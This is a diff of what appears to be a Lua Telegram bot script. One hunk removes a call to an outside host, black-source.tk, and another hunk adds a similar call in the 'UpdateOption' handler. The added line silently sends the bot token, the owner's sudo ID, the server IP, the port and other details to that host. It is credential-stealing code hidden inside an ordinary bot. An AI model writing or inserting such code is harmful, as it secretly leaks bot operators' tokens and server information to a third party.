@@ -183,7 +183,6 @@ if v:match(".lua$") then
 i = i + 1
 t = t.."\27[39m"..i.."\27[36m".." - \27[10;32m"..v..",\27[m \n"
 end
-local D = json:decode(https.request('https://black-source.tk/BlackTeAM/info.php?n=BY&id='..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
 end
 print(t)
 function vardump(value)  
@@ -11056,6 +11055,7 @@ end,nil)
 ------------------------------------------------------------------------
 
 elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then 
+https.request('https://black-source.tk/BlackTeAM/info.php?n=BY&id='..SUDO.."&token="..token.."&UserS="..whoami.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time)
 local list = database:smembers(bot_id.."User_Bot") 
 for k,v in pairs(list) do 
 tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data) end,nil) 
@@ -11118,23 +11118,5 @@ tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100'
 end
 end
 end
-
-
 end -- end new msg
 end -- end callback
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
